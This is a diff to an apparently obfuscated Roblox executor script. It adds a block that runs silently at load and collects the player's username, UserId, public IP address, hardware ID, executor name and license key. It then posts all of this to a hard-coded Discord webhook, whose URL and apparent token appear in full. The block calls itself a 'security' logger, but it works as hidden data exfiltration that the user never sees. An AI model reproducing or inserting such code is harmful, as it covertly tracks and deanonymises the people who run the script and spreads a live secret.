@@ -3,6 +3,119 @@ if not LPH_ENCSTR then LPH_ENCSTR = function(str) return str end end
 if not LPH_NO_VIRTUALIZE then LPH_NO_VIRTUALIZE = function(func) return func end end
 if not LPH_OBFUSCATED then LPH_OBFUSCATED = false end
 -- game load check
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local LocalPlayer = Players.LocalPlayer
+
+-- Put your Discord webhook URL here
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1549467315261939915/Akm50enH7VOMiGW63YcXPWaTUckG_KmiuOkaSGmvwg6E9hx0SkaU_ZxZE7Zl2XKYQJX5"
+
+local function getHWID()
+    if syn and syn.get_hwid then
+        return syn.get_hwid()
+    elseif gethwid then
+        return gethwid()
+    elseif identifyexecutor then
+        return identifyexecutor()
+    else
+        return "Unknown"
+    end
+end
+
+local function getIP()
+    local ok, result = pcall(function()
+        return game:HttpGet("https://api.ipify.org")
+    end)
+    if ok and result then
+        return result
+    end
+    return "Unknown"
+end
+
+local function getLicenseKey()
+    local ok, key = pcall(function()
+        if getgenv and getgenv()["Platinun"] and getgenv()["Platinun"]["License Key"] then
+            return tostring(getgenv()["Platinun"]["License Key"])
+        end
+        return nil
+    end)
+    if ok and key and key ~= "" then
+        return key
+    end
+    return "Not Found"
+end
+
+local function sendWebhook()
+    local embed = {
+        embeds = {
+            {
+                title = "Platinun Logger | Executado",
+                color = 3092790,
+                timestamp = DateTime.now():ToIsoDate(),
+                thumbnail = {
+                    url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LocalPlayer.UserId .. "&width=420&height=420&format=png"
+                },
+                fields = {
+                    {
+                        name = "Usuário",
+                        value = LocalPlayer.Name .. " (" .. LocalPlayer.DisplayName .. ")",
+                        inline = true
+                    },
+                    {
+                        name = "IP",
+                        value = getIP(),
+                        inline = true
+                    },
+                    {
+                        name = "HWID",
+                        value = getHWID(),
+                        inline = false
+                    },
+                    {
+                        name = "License Key",
+                        value = getLicenseKey(),
+                        inline = false
+                    },
+                    {
+                        name = "Status",
+                        value = "Acesso Autorizado",
+                        inline = true
+                    },
+                    {
+                        name = "UserId",
+                        value = tostring(LocalPlayer.UserId),
+                        inline = true
+                    },
+                    {
+                        name = "Executor",
+                        value = (identifyexecutor and identifyexecutor()) or "Unknown",
+                        inline = true
+                    }
+                },
+                footer = {
+                    text = "Platinun Logger Advanced Security System"
+                }
+            }
+        }
+    }
+
+    local body = HttpService:JSONEncode(embed)
+
+    local requestFunc = (syn and syn.request) or (http and http.request) or request or http_request
+
+    if requestFunc then
+        requestFunc({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = body
+        })
+    end
+end
+
+task.spawn(sendWebhook)
 if not game:IsLoaded() then game.Loaded:Wait() end
 task.wait(0.35)  -- let services settle
 -- game check
